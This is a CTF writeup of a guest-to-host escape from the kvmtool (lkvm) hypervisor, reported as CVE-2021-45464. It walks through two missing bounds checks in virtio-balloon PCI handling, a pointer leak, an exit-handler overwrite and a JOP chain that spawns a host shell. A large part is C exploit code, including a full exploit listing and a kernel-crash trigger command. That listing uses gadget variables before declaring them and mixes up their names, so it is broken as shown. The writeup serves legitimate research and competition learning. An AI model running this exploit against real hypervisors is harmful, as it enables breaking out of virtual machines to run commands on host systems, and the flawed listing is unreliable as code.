=== Content from www.kalmarunionen.dk_d33cfe7c_20250114_215630.html ===
[Kalmarunionenopen-menucloseme](https://www.kalmarunionen.dk/ "Kalmarunionen")[Writeups ![icon](https://www.kalmarunionen.dk/icon/caret-icon.svg)](https://www.kalmarunionen.dk/writeups/)
[ASIS CTF - xtr](https://www.kalmarunionen.dk/writeups/2022/asis/xtr/)
[BambooFox CTF: The Vault](https://www.kalmarunionen.dk/writeups/2021/bamboofox-ctf/the-vault/)
[BSidesSF 2021: Log 'em All](https://www.kalmarunionen.dk/writeups/2021/bsidessf/logem-all/)
[De Danske Cybermesterskaber: 80s Commitments](https://www.kalmarunionen.dk/writeups/2021/ddc-2021/80s-commitments/)
[De Danske Cybermesterskaber: Kuuuurveen](https://www.kalmarunionen.dk/writeups/2021/ddc-2021/kuuuurveen/)
[FaustCTF 2021 - Attack & Defense - thelostbottle](https://www.kalmarunionen.dk/writeups/2021/faust2021/writeup/)
[Hack.lu CTF - Nodenb](https://www.kalmarunionen.dk/writeups/2021/hack.lu-ctf/nodenb/)
[LKVM Escape](https://www.kalmarunionen.dk/writeups/2021/hxp-2021/lkvm/)
[MidnightSun Quals: kgbfskfsb](https://www.kalmarunionen.dk/writeups/2022/midnightsun-quals-kgb/kgbfskfsb/)
[MidnightSun Quals: Revver](https://www.kalmarunionen.dk/writeups/2022/midnightsun-quals-revver/readme/)
[Pwn2win - Hackus](https://www.kalmarunionen.dk/writeups/2021/pwn2win/hackus/)
[Qiling Sandbox Escape](https://www.kalmarunionen.dk/writeups/2022/rwctf/qlaas/)
[Real World CTF 4th: Secured Java](https://www.kalmarunionen.dk/writeups/2022/rwctf/secured-java/)
[SekaiCTF 2023 - Leakless Note](https://www.kalmarunionen.dk/writeups/2023/sekai/leakless-notes/)
[Sudo Exploit Writeup](https://www.kalmarunionen.dk/writeups/sudo/)
[Union CTF 2021: Cr0wnAir](https://www.kalmarunionen.dk/writeups/2021/union-ctf-2021/cr0wnair/)[Become a member](https://www.kalmarunionen.dk/posts/become-a-member/)[Sponsors](https://www.kalmarunionen.dk/posts/sponsors/)[About](https://www.kalmarunionen.dk/posts/about/)[News ![icon](https://www.kalmarunionen.dk/icon/caret-icon.svg)](https://www.kalmarunionen.dk/)
[2025 - Kalmarunionen is now officially the #1 competitive hacking team in the world!](https://www.kalmarunionen.dk/news/2025-01-ctftime/)
[2024 - Chaos Communication Congress (38C3) HXP CTF](https://www.kalmarunionen.dk/news/2024-12-ccc/)
[2024 - SECCON CTF](https://www.kalmarunionen.dk/news/2024-11-seccon/)
[2024 - Cybersecurity Awareness Month](https://www.kalmarunionen.dk/news/2024-10/)
[2024 - Google CTF](https://www.kalmarunionen.dk/news/2024-06-googlectf/)
[2024 - Aim for DEFCON Glory - Call for sponsors](https://www.kalmarunionen.dk/news/2024-04/)
[2024 - Kalmar CTF](https://www.kalmarunionen.dk/news/2024-03-kalmarctf/)
[2024 - Real World CTF](https://www.kalmarunionen.dk/news/2024-01-rwctf/)
# LKVM Escape

calendar
Dec 17, 2021
Â· 16 min read Â· [web](https://www.kalmarunionen.dk/tags/web/ "web")[race-conditions](https://www.kalmarunionen.dk/tags/race-conditions/ "race-conditions") Â·Share on:
[twitter](https://twitter.com/intent/tweet?text=LKVM%20Escape&url=https%3a%2f%2fwww.kalmarunionen.dk%2fwriteups%2f2021%2fhxp-2021%2flkvm%2f&tw_p=tweetbutton "Share on Twitter")[facebook](https://www.facebook.com/sharer.php?u=https%3a%2f%2fwww.kalmarunionen.dk%2fwriteups%2f2021%2fhxp-2021%2flkvm%2f&t=LKVM%20Escape "Share on Facebook")[linkedin](#linkedinshare "Share on LinkedIn")[copy](https://www.kalmarunionen.dk/writeups/2021/hxp-2021/lkvm/ "Copy Link")
## Overview

* [Attack Surface](#attack-surface)
* [Information Leak](#information-leak)
* [Getting Control of Program Flow](#getting-control-of-program-flow)
* [Putting it all together](#putting-it-all-together)

Writeup by: [Zanderdk](https://twitter.com/alexanderkrog) | [linkedin](https://www.linkedin.com/in/alexander-dalsgaard-krog/)

Solved by: [ZZZ](https://twitter.com/viktoredstrom) | [linkedin](https://www.linkedin.com/in/viktoredstrom/), [N00byedge](https://twitter.com/N00byEdge) | [linkedin](https://www.linkedin.com/in/hannes-bredberg-35996170/)

# Indie VMM - HXP 2021

In this challenge we are given a root access to a linux machine running in the linux tools hypervisor and the goal is to escape out of the hypervisor to access the flag file on the host system. During this challenge we discovered multiple bugs leading to a zero-day exploit for lkvm which allows an attacker with access to the guest virtual machine to execute arbitrary commands on host machine. :-)

Throughout this writeup i will be referring to git checkout 39181fc6429f4e9e71473284940e35857b42772a of [kvmtool](https://git.kernel.org/pub/scm/linux/kernel/git/will/kvmtool.git/) when mentioning line numbers.

## Attack Surface

As we are running inside a hypervisor and have clear separation between host and guest memory, we need a way of interacting with host process. There is one way of communicating with the host namely pci. Lkvm emulates 3 hardware devices though pci: virtio-console, virtio-net, virtio-balloon. We can interact with these devices using memory mapped io aka. reading and writing to specific physical memory addresses.
Fx. if we write to addresses in the following range 0xd2000000-0xd20000ff (balloon-virtio) the guest is interrupted and control flow is passed to the linux kernel kvm driver and further to lkvm process.

## Information Leak

One of the first functions we hit when reading from this address is `virtio_pci__data_in` in virtio/pci.c line 148:

```
static bool virtio_pci__data_in(struct kvm_cpu *vcpu, struct virtio_device *vdev,
				unsigned long offset, void *data, int size)
{
	bool ret = true;
	struct virtio_pci *vpci;
	struct virt_queue *vq;
	struct kvm *kvm;
	u32 val;
	kvm = vcpu->kvm;
	vpci = vdev->virtio;
	switch (offset) {
	case VIRTIO_PCI_HOST_FEATURES:
		val = vdev->ops->get_host_features(kvm, vpci->dev);
		ioport__write32(data, val);
		break;
	case VIRTIO_PCI_QUEUE_PFN:
		vq = vdev->ops->get_vq(kvm, vpci->dev, vpci->queue_selector);
		ioport__write32(data, vq->pfn);
		break;
	case VIRTIO_PCI_QUEUE_NUM:
		val = vdev->ops->get_size_vq(kvm, vpci->dev, vpci->queue_selector);
		ioport__write16(data, val);
		break;
	case VIRTIO_PCI_STATUS:
		ioport__write8(data, vpci->status);
		break;
	case VIRTIO_PCI_ISR:
		ioport__write8(data, vpci->isr);
		kvm__irq_line(kvm, vpci->legacy_irq_line, VIRTIO_IRQ_LOW);
		vpci->isr = VIRTIO_IRQ_LOW;
		break;
	default:
		ret = virtio_pci__specific_data_in(kvm, vdev, data, size, offset);
		break;
	};
	return ret;
}

```

this function switches on the offset into the bar (address range), meaning that if we fx read at address `0xd2000000 + VIRTIO_PCI_QUEUE_NUM == 0xd2000008` we will hit the second switch case. Here the default case is very interesting. The default case calls `virtio_pci__specific_data_in` on line 118:

```
static bool virtio_pci__specific_data_in(struct kvm *kvm, struct virtio_device *vdev,
					 void *data, int size, unsigned long offset)
{
	u32 config_offset;
	struct virtio_pci *vpci = vdev->virtio;
	int type = virtio__get_dev_specific_field(offset - 20,
							virtio_pci__msix_enabled(vpci),
							&config_offset);
	if (type == VIRTIO_PCI_O_MSIX) {
		switch (offset) {
		case VIRTIO_MSI_CONFIG_VECTOR:
			ioport__write16(data, vpci->config_vector);
			break;
		case VIRTIO_MSI_QUEUE_VECTOR:
			ioport__write16(data, vpci->vq_vector[vpci->queue_selector]);
			break;
		};
		return true;
	} else if (type == VIRTIO_PCI_O_CONFIG) {
		u8 cfg;
		cfg = vdev->ops->get_config(kvm, vpci->dev)[config_offset];
		ioport__write8(data, cfg);
		return true;
	}
	return false;
}

```

Here we will always end up in the `else if` case as this is not MSIX. `config_offset` is calculated base on `offset` passed from `virtio_pci__data_in` and we see that it is accessing completely without any bound checks.
The value of `config_offset` is calculated as a return parameter in the call to `virtio__get_dev_specific_field`. In case we are not do a MSIX operation config\_offset is just set to the value of the first parameter passed to `virtio__get_dev_specific_field` which is `offset - 20`.

So far we have only been looking at virtio and pci generic function but here the ops->get\_config is called which fetched the `u8 *` config from the balloon driver in this case.
This function is just a simple getter and looks like this:

```
static u8 *get_config(struct kvm *kvm, void *dev)
{
	struct bln_dev *bdev = dev;
	return ((u8 *)(&bdev->config));
}

```

As we can see the below `virtio_balloon_config` is the last element of the struct and as the observant reader might have noticed the config struct is very small. As the bar is 0x100 big (0xd2000000-0xd20000ff) and as long as we set `offset` higher than 20 we will access into the config struct and beyond as `0x100 > 20 + sizeof(virtio_balloon_config)`. A similar write to config function exists when writing in this bar, meaning that we have a read/write out of bound primitive here.

```
struct bln_dev {
	struct list_head	list;
	struct virtio_device	vdev;
	u32			features;
	/* virtio queue */
	struct virt_queue	vqs[NUM_VIRT_QUEUES];
	struct thread_pool__job	jobs[NUM_VIRT_QUEUES];
	struct virtio_balloon_stat stats[VIRTIO_BALLOON_S_NR];
	struct virtio_balloon_stat *cur_stat;
	u32			cur_stat_head;
	u16			stat_count;
	int			stat_waitfd;
	struct virtio_balloon_config config;
};
struct virtio_balloon_config {
	/* Number of pages host wants Guest to give up. */
	__le32 num_pages;
	/* Number of pages we've actually got in balloon. */
	__le32 actual;
	/*
	 * Free page hint command id, readonly by guest.
	 * Was previously named free_page_report_cmd_id so we
	 * need to carry that name for legacy support.
	 */
	union {
		__le32 free_page_hint_cmd_id;
		__le32 free_page_report_cmd_id;	/* deprecated */
	};
	/* Stores PAGE_POISON if page poisoning is in use */
	__le32 poison_val;
};

```

This memory is not stored on the stack but rather in a kinda uninteresting mmaped area. This means that we were not able to get control of the program flow from smashing this memory area. However we were able to leak information from this bug namely two pointers of interest were leaked, a address to the bln\_dev structure itself and a address revelling the base address of the lkvm binary.

To execute this leaking from a userspace process we use `/dev/mem` to access the physical memory of the guest and in code it looks something like this:

```
char *mmio_mem;
u8 ioread8(u64 off) { return *(volatile uint8_t *)(mmio_mem + off); }
u16 ioread16(u64 off) { return *(volatile uint16_t *)(mmio_mem + off); }
u32 ioread32(u64 off) { return *(volatile uint32_t *)(mmio_mem + off); }
void iowrite8(u64 off, u8 val) { *(volatile uint8_t *)(mmio_mem + off) = val; }
void iowrite16(u64 off, u16 val) { *(volatile uint16_t *)(mmio_mem + off) = val; }
void iowrite32(u64 off, u32 val) { *(volatile uint32_t *)(mmio_mem + off) = val; }
u64 leak_u64(u64 off) {
    u64 leak;
    for (int i = 0; i < 8; i++) {
        u8 val = ioread8(20 + i + off);
        *(((char *)&leak)+i) = val;
    }
    return leak;
}
int main(void)
{
    int fuck = open("/dev/mem", O_RDWR);
    mmio_mem = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fuck, 0xd2000000);
    u64 lkvm_leak = leak_u64(0x44);
    printf("lkvm leak: %p\n", (void *)lkvm_leak);
}

```

Here the `leak_u64` uses ioread8 to read from the mmap `/dev/mem` area at 0xd2000000 where the virtio-balloon is located. We offset the 20 bytes plus a out of bound offset to where we find the address pointing into the lkvm executable and boom we have our information leak. and the same procedure can be repeated for the `bln_dev` leak.

## Getting Control of Program Flow

Now to the fun part, lets get that `rip` control. Lets for a second assume that we could use the previous bug to write arbitrary out of bound what intreating data could we corrupt? In the picture bellow i have set a breakpoint in the `virtio_pci__specific_data_in` function to inspect the bln\_dev memory. Here i have dumped the memory following the config struct. We see some structures called `exit_lists` which unfortunately is of reach due to the 0x100 limitation. But what is it?

![Addresses might seams a bit screwed because the dump is not 0x10 aligned due to the offset - 20 in virtio_pci__specific_data_in](https://www.kalmarunionen.dk/images/bdev.png)

When the lkvm binary closes it executes a tear down process involving calling some exit handlers and this it what we find here. If we look inside the init.c at line 51 we find this lovely peace of code:

```
int init_list__exit(struct kvm *kvm)
{
	int i;
	int r = 0;
	struct init_item *t;
	for (i = ARRAY_SIZE(exit_lists) - 1; i >= 0; i--)
		hlist_for_each_entry(t, &exit_lists[i], n) {
			r = t->init(kvm);
			if (r < 0) {
				pr_warning("%s failed.\n", t->fn_name);
				goto fail;
			}
		}
fail:
	return r;
}

```

Here we se that upon exiting lkvm loop over an array `struct init_item`’s and call the function `t->init` on each element starting from the last element in the array. This is the `exit_lists` from before. each entry in the list is a pointer to a init\_item (this struct is also used doing initialization therefore the name). If we can control one of these pointers we can potentially construct a fake `init_item` and change the program flow when terminating the guest os.

```
struct hlist_node {
	struct hlist_node *next, **pprev;
};
struct init_item {
	struct hlist_node n;
	const char *fn_name;
	int (*init)(struct kvm *);
};

```

Looking at the struct definition for a init\_item above we see that it’s pretty simple containing 2 linked list pointers, a name pointer and the actual function pointer we want control of at offset 0x18 from top of the `struct init_item`.

Now if you remember we also had other functionality in the `virtio_pci__data_in` function than just the read and write from config. Let’s have a look at the data\_out equivalent of this function in virtio/pci.c line 287:

```
static bool virtio_pci__data_out(struct kvm_cpu *vcpu, struct virtio_device *vdev,
				 unsigned long offset, void *data, int size)
{
	bool ret = true;
	struct virtio_pci *vpci;
	struct kvm *kvm;
	u32 val;
	kvm = vcpu->kvm;
	vpci = vdev->virtio;
	switch (offset) {
	case VIRTIO_PCI_GUEST_FEATURES:
		val = ioport__read32(data);
		virtio_set_guest_features(kvm, vdev, vpci->dev, val);
		break;
	case VIRTIO_PCI_QUEUE_PFN:
		val = ioport__read32(data);
		if (val) {
			virtio_pci__init_ioeventfd(kvm, vdev,
						   vpci->queue_selector);
			vdev->ops->init_vq(kvm, vpci->dev, vpci->queue_selector,
					   1 << VIRTIO_PCI_QUEUE_ADDR_SHIFT,
					   VIRTIO_PCI_VRING_ALIGN, val);
		} else {
			virtio_pci_exit_vq(kvm, vdev, vpci->queue_selector);
		}
		break;
	case VIRTIO_PCI_QUEUE_SEL:
		vpci->queue_selector = ioport__read16(data);
		break;
	case VIRTIO_PCI_QUEUE_NOTIFY:
		val = ioport__read16(data);
		vdev->ops->notify_vq(kvm, vpci->dev, val);
		break;
	case VIRTIO_PCI_STATUS:
		vpci->status = ioport__read8(data);
		if (!vpci->status) /* Sample endianness on reset */
			vdev->endian = kvm_cpu__get_endianness(vcpu);
		virtio_notify_status(kvm, vdev, vpci->dev, vpci->status);
		break;
	default:
		ret = virtio_pci__specific_data_out(kvm, vdev, data, size, offset);
		break;
	};
	return ret;
}

```

Here the second case for `VIRTIO_PCI_QUEUE_PFN` is rather interesting as this calls the virtio-balloon specific init virtual queue function. We can find this function in virtio/balloon.c at line 200.
Below i have shown all of the relevant functions in one listing:

```
//balloon.c line 200
static int init_vq(struct kvm *kvm, void *dev, u32 vq, u32 page_size, u32 align,
		   u32 pfn)
{
	struct bln_dev *bdev = dev;
	struct virt_queue *queue;
	void *p;
	compat__remove_message(compat_id);
	queue		= &bdev->vqs[vq];
	queue->pfn	= pfn;
	p		= virtio_get_vq(kvm, queue->pfn, page_size);
	thread_pool__init_job(&bdev->jobs[vq], kvm, virtio_bln_do_io, queue);
	vring_init(&queue->vring, VIRTIO_BLN_QUEUE_SIZE, p, align);
	virtio_init_device_vq(&bdev->vdev, queue);
	return 0;
}
//virtio.h line 214
static inline void *virtio_get_vq(struct kvm *kvm, u32 pfn, u32 page_size)
{
	return guest_flat_to_host(kvm, (u64)pfn * page_size);
}
//virtio_ring.h line 191
static __inline__ void vring_init(struct vring *vr, unsigned int num, void *p,
			      unsigned long align)
{
	vr->num = num;
	vr->desc = p;
	vr->avail = (struct vring_avail *)((char *)p + num * sizeof(struct vring_desc));
	vr->used = (void *)(((uintptr_t)&vr->avail->ring[num] + sizeof(__virtio16)
		+ align-1) & ~(align - 1));
}

```

As we can see when `vring_init` is called it sets `vr->desc = p` which is a `void *` to a guest physical page that we fully control the content of. We can see this as `vring_init` is called from `init_vq` with `p` as argument and `p` is obtained from `virtio_get_vq` where it finds the host virtual address for a given page frame number (pfn). In `init_vq` we see that the parameter `vq` is used to calculate the offset into the `bdev->vqs` array. This `queue = &bdev->vqs[vq];` statement is again completely without any bound checks although there is only 3 queues at any given time. This means that if we control the `vq` parameter we can effectively insert a pointer to guest memory out of bound.

In the listing for `virtio_pci__data_out` the call to `init_vq` is passed `vpci->queue_selector` as the argument for `vq` and in the same listing we also find that we control `vpci->queue_selector` entirely using the `VIRTIO_PCI_QUEUE_SEL` case in the switch statement.

Looking at the struct definition of the `vring *vr` below we see the it has 4 members and a size of 0x20 meaning we can’t insert this pointer at arbitrary locations. but only at offsset 0x20\*x + 8 where we fully control x.

```
//virtio_ring.h line 143
typedef struct vring_desc __attribute__((aligned(VRING_DESC_ALIGN_SIZE)))
	vring_desc_t;
typedef struct vring_avail __attribute__((aligned(VRING_AVAIL_ALIGN_SIZE)))
	vring_avail_t;
typedef struct vring_used __attribute__((aligned(VRING_USED_ALIGN_SIZE)))
	vring_used_t;
struct vring {
	unsigned int num;
	vring_desc_t *desc;
	vring_avail_t *avail;
	vring_used_t *used;
};

```

If you recall from before we had the `exit_lists` not far from the locations of this bdev struct and now we have a unbound insert pointer premitive and it just so happens that if we set `vq` to 0x16 we end up inserting this pointer in the last entry of this `exit_lists`. In code this looks like so:

```
#define VIRTIO_PCI_QUEUE_PFN		8
#define VIRTIO_PCI_QUEUE_SEL		14
char *mmio_mem;
u8 ioread8(u64 off) { return *(volatile uint8_t *)(mmio_mem + off); }
u16 ioread16(u64 off) { return *(volatile uint16_t *)(mmio_mem + off); }
u32 ioread32(u64 off) { return *(volatile uint32_t *)(mmio_mem + off); }
void iowrite8(u64 off, u8 val) { *(volatile uint8_t *)(mmio_mem + off) = val; }
void iowrite16(u64 off, u16 val) { *(volatile uint16_t *)(mmio_mem + off) = val; }
void iowrite32(u64 off, u32 val) { *(volatile uint32_t *)(mmio_mem + off) = val; }
void vp_legacy_set_queue_address(u16 index, u32 queue_pfn)
{
	iowrite16(VIRTIO_PCI_QUEUE_SEL, index);
	iowrite32(VIRTIO_PCI_QUEUE_PFN, queue_pfn);
}
int main(void)
{
    int fuck = open("/dev/mem", O_RDWR);
    mmio_mem = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fuck, 0xd2000000);
    int fuck2 = open("/dev/mem", O_RDWR);
    void *yolo = mmap((void *)0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fuck2, 1 << 12);
    memset(yolo, 'A', 0x200);
    vp_legacy_set_queue_address(0x16, 0x1);
    system("echo c > /proc/sysrq-trigger");
}

```

Here we set the page frame number to 0x1 meaning guest physical address 0x1000, and again use `/dev/mem` to map the physical address 0x1000 to a address in the userspace process we can manipulate. Apparently rebooting or exiting the guest OS in any sane way did not cause these exit handlers to be called, but luckily crashing the kernel on a undefined instruction does :D So that is the reason for the ugly as fuck `echo c > /proc/sysrq-trigger`.

Memory dump before exiting:![0x41 is leet speak for A](https://www.kalmarunionen.dk/images/exit_handler_crash.png)

Here we see all the `'A's` inserted from the memset above apearing at the address inside `exit_lists+72`. and it’s is obvious that we now control the program flow as `t->init(kvm)` calls this address that we fully control. Sweet now we got that `rip` control and we can redirect program flow.

Now we need a target to redirect our code to in order to execute code or commands on the host system, lucaly this binary basicaly has a ret to own function `virtio_net_exec_script`:

![Super awsome ret to win gadget, even better than exeve :D](https://www.kalmarunionen.dk/images/virtio_net_exec_script.png)

Now if we can control the $rdi regsiter and jump to the instruction marked by the red arrow in virtio\_net\_exec\_script we effectively call `execl(command_we_control, ...)` and execute a command on the host system.

## Putting it all together

Now we have all the necessary parts to construct a fake `init_item` launching a ROP chain that calls exevl or more like a JOP chain as we will from here heavily rely on Jump oriented programming.
To summarize we now have a leak using the first bug as well as the ability to control some of the bytes in that area as we can also write in the area we leak from. And we have a way of getting `rip` control but unfotunatly we don’t control any of the arguments to this functions call kvm in `t->init(kvm)` is not whitin the same mmap slide.

When we fist do the initial call to `t->init` `$rbx` points to our fake `init_item` aka memory we control.

First we jump to this gadget: `mov rax, qword ptr [rbx + 0x28]; mov rdi, rbx; mov rsi, qword ptr [rax + 8]; call qword ptr [rax];`

This moves `$rbx` into `$rdi` allowing us to control the first argument of any fuction call and again fetching a new location to jump to from `[$rbx + 0x28]`.

and now we can just jump to the super awsome gadget from before as we now have `$rdi` control.

![Stack go boom boom!!!!](https://www.kalmarunionen.dk/images/lkvm_excel.png)

Now this calls `execl("/bin/sh", "", null);` and we get a shell back :D
We have registered the CVE-2021-45464 which is currently reserved and waiting for approval.
Here is the full exploit code but be aware it will not work out of the box for any version of lkvm the gadget offsets has to be changed for the specific binary:

```
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/klog.h>
#include <unistd.h>
#include <time.h>
#include <sys/shm.h>
#include <sys/timerfd.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <errno.h>
#include <sys/msg.h>
#include <dirent.h>
#include <sys/sendfile.h>
#include <sys/resource.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/syscall.h>   /* Definition of SYS_* constants */
#include <unistd.h>
#include <sys/reboot.h>    /* Definition of RB_* constants */
#define u64 uint64_t
#define u32 uint32_t
#define u16 uint16_t
#define u8 uint8_t
void shell(void)
{
    setuid(0);
    setgid(0);
    setreuid(-1, 0);
    setregid(-1, 0);
    char *arg[] = {"/bin/sh", NULL};
    execve("/bin/sh", arg, NULL);
}
/* A 32-bit r/o bitmask of the features supported by the host */
#define VIRTIO_PCI_HOST_FEATURES	0
/* A 32-bit r/w bitmask of features activated by the guest */
#define VIRTIO_PCI_GUEST_FEATURES	4
/* A 32-bit r/w PFN for the currently selected queue */
#define VIRTIO_PCI_QUEUE_PFN		8
/* A 16-bit r/o queue size for the currently selected queue */
#define VIRTIO_PCI_QUEUE_NUM		12
/* A 16-bit r/w queue selector */
#define VIRTIO_PCI_QUEUE_SEL		14
/* A 16-bit r/w queue notifier */
#define VIRTIO_PCI_QUEUE_NOTIFY		16
/* An 8-bit device status register.  */
#define VIRTIO_PCI_STATUS		18
/* An 8-bit r/o interrupt status register.  Reading the value will return the
 * current contents of the ISR and will also clear it.  This is effectively
 * a read-and-acknowledge. */
#define VIRTIO_PCI_ISR			19
char *mmio_mem;
size_t mmio_result;
#define MMIO_WRITE(addr, value) (*((volatile u64 *)(mmio_mem + (addr))) = (value));
#define MMIO_READ(addr) (mmio_result = *((volatile u64 *)(mmio_mem + (addr))));
u8 ioread8(u64 off) { return *(volatile uint8_t *)(mmio_mem + off); }
u16 ioread16(u64 off) { return *(volatile uint16_t *)(mmio_mem + off); }
u32 ioread32(u64 off) { return *(volatile uint32_t *)(mmio_mem + off); }
void iowrite8(u64 off, u8 val) { *(volatile uint8_t *)(mmio_mem + off) = val; }
void iowrite16(u64 off, u16 val) { *(volatile uint16_t *)(mmio_mem + off) = val; }
void iowrite32(u64 off, u32 val) { *(volatile uint32_t *)(mmio_mem + off) = val; }
u64 leak_u64(u64 off) {
    u64 leak;
    for (int i = 0; i < 8; i++) {
        u8 val = ioread8(20 + i + off);
        *(((char *)&leak)+i) = val;
    }
    return leak;
}
void vp_legacy_set_queue_address(u16 index, u32 queue_pfn)
{
	iowrite16(VIRTIO_PCI_QUEUE_SEL, index);
	iowrite32(VIRTIO_PCI_QUEUE_PFN, queue_pfn);
}
int main(void)
{
    u8 buf[0x1000];
    u64 pic_addr;
    // shell();
    int fd = open("/sys/devices/pci0000:00/0000:00:00.0/resource", O_RDONLY);
    if (fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0, sizeof(buf));
    read(fd, buf, sizeof(buf));
    close(fd);
    sscanf(buf, "%p", &pic_addr);
    printf("PIC address: %p\n", pic_addr);
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:00.0/resource1", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
    mmio_mem = mmap((void *)0xabc0000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0x0);
    if (mmio_mem == MAP_FAILED)
    {
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    printf("mmio_mem: %p\n", mmio_mem);
    int fuck = open("/dev/mem", O_RDWR);
    mmio_mem = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fuck, 0xd2000000);
    printf("%p\n", mmio_mem);
    u64 lkvm_leak = leak_u64(0x44);
    printf("lkvm_leak %p\n", (void *)lkvm_leak);
    u64 dumb_heap = leak_u64(0x34);
    printf("dumb heap %p\n", (void *)dumb_heap);
    u64 guest_leak = leak_u64(0xd0);
    printf("guest_leak %p\n", (void *)guest_leak);
    u64 r8 = dumb_heap - 0x210 + 0x20;
    printf("r8 %p\n", (void *)r8);
    u64 base = lkvm_leak - 0x192f0;
    printf("dumb base %p\n", (void *)base);
    u64 guest_space = 0x2a7d7ae5ec40 + r8;
    printf("shit!!!!: %p\n", (void *) guest_space);
    u64 exec_gadget = base + 0x0157C0;
    vp_legacy_set_queue_address(0x16, 0x1);

    char buf2[0xb0];
    memset(buf2, 0x51, sizeof(buf2));
    u64 *jop2 = (u64 *)buf2;
    jop2[0x8/8] = execl_gadget;
    for (int i = 0; i < sizeof(buf2); i++)
        iowrite8(24 + i, buf2[i]);
    int fuck2 = open("/dev/mem", O_RDWR);
    void *yolo = mmap((void *)0x0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fuck2, 1 << 12);
    memset(yolo, 'A', 0x200);
    strcpy(yolo, "/bin/sh");
    u64 *jop1 = (u64 *)yolo;
    jop1[0x18/8] = jop_gadget_1;
    u64 jop_gadget_1 = base + 0x000000000000ce9c;
    u64 execl_gadget = base + 0x15847;
    system("echo c > /proc/sysrq-trigger");
}

```
## Recent Posts

* [2025 - Kalmarunionen is now officially the #1 competitive hacking team in the world!](https://www.kalmarunionen.dk/news/2025-01-ctftime/)
* [2024 - Chaos Communication Congress (38C3) HXP CTF](https://www.kalmarunionen.dk/news/2024-12-ccc/)
* [2024 - SECCON CTF](https://www.kalmarunionen.dk/news/2024-11-seccon/)
* [2024 - Cybersecurity Awareness Month](https://www.kalmarunionen.dk/news/2024-10/)
* [2024 - Google CTF](https://www.kalmarunionen.dk/news/2024-06-googlectf/)
* [2024 - Aim for DEFCON Glory - Call for sponsors](https://www.kalmarunionen.dk/news/2024-04/)
* [2024 - Kalmar CTF](https://www.kalmarunionen.dk/news/2024-03-kalmarctf/)
* [Sponsors](https://www.kalmarunionen.dk/posts/sponsors/)

## Categories

[WRITEUPS
17](https://www.kalmarunionen.dk/categories/writeups/)[NEWS
8](https://www.kalmarunionen.dk/categories/news/)[DDC 2021
2](https://www.kalmarunionen.dk/categories/ddc-2021/)[MIDNIGHTSUN
2](https://www.kalmarunionen.dk/categories/midnightsun/)[BSIDESSF 2021 CTF
1](https://www.kalmarunionen.dk/categories/bsidessf-2021-ctf/)[FAUST CTF 2021
1](https://www.kalmarunionen.dk/categories/faust-ctf-2021/)[HACK.LU CTF
1](https://www.kalmarunionen.dk/categories/hack.lu-ctf/)[HXP
1](https://www.kalmarunionen.dk/categories/hxp/)[REAL CVE
1](https://www.kalmarunionen.dk/categories/real-cve/)[REAL WORLD CTF
1](https://www.kalmarunionen.dk/categories/real-world-ctf/)[SEKAICTF 2023
1](https://www.kalmarunionen.dk/categories/sekaictf-2023/)
## Tags

[CRYPTO
8](https://www.kalmarunionen.dk/tags/crypto/)[LINKEDIN
8](https://www.kalmarunionen.dk/tags/linkedin/)[2024
7](https://www.kalmarunionen.dk/tags/2024/)[WEB
5](https://www.kalmarunionen.dk/tags/web/)[RACE-CONDITIONS
3](https://www.kalmarunionen.dk/tags/race-conditions/)[REV
2](https://www.kalmarunionen.dk/tags/rev/)[XSS
2](https://www.kalmarunionen.dk/tags/xss/)[38C3
1](https://www.kalmarunionen.dk/tags/38c3/)[ADVANCED WEB
1](https://www.kalmarunionen.dk/tags/advanced-web/)[ATTACK-DEFENSE
1](https://www.kalmarunionen.dk/tags/attack-defense/)[C++
1](https://www.kalmarunionen.dk/tags/c%2B%2B/)[CLONE-AND-PWN
1](https://www.kalmarunionen.dk/tags/clone-and-pwn/)[CTFTIME
1](https://www.kalmarunionen.dk/tags/ctftime/)[CYBERSECURITYAWARENESSMONTH
1](https://www.kalmarunionen.dk/tags/cybersecurityawarenessmonth/)[GAME
1](https://www.kalmarunionen.dk/tags/game/)[GOOGLE CTF
1](https://www.kalmarunionen.dk/tags/google-ctf/)[HACKING
1](https://www.kalmarunionen.dk/tags/hacking/)[HXPCTF
1](https://www.kalmarunionen.dk/tags/hxpctf/)[JOURNEY
1](https://www.kalmarunionen.dk/tags/journey/)[KALMARCTF
1](https://www.kalmarunionen.dk/tags/kalmarctf/)[MIDNIGHT SUN
1](https://www.kalmarunionen.dk/tags/midnight-sun/)[MISC
1](https://www.kalmarunionen.dk/tags/misc/)[PLAIDCTF
1](https://www.kalmarunionen.dk/tags/plaidctf/)[PWN
1](https://www.kalmarunionen.dk/tags/pwn/)[PYTHON
1](https://www.kalmarunionen.dk/tags/python/)[QILING
1](https://www.kalmarunionen.dk/tags/qiling/)[RCE
1](https://www.kalmarunionen.dk/tags/rce/)[REAL WORLD CTF
1](https://www.kalmarunionen.dk/tags/real-world-ctf/)[REAL-WORLD
1](https://www.kalmarunionen.dk/tags/real-world/)[SANDBOX-ESCAPE
1](https://www.kalmarunionen.dk/tags/sandbox-escape/)[SECCONCTF
1](https://www.kalmarunionen.dk/tags/secconctf/)[SUDO
1](https://www.kalmarunionen.dk/tags/sudo/)[SUNDHEDSKORT
1](https://www.kalmarunionen.dk/tags/sundhedskort/)[UMDCTF
1](https://www.kalmarunionen.dk/tags/umdctf/)[USE-AFTER-FREE
1](https://www.kalmarunionen.dk/tags/use-after-free/)[XS-SEARCH
1](https://www.kalmarunionen.dk/tags/xs-search/)[Z3
1](https://www.kalmarunionen.dk/tags/z3/)
## Sponsor Highlight

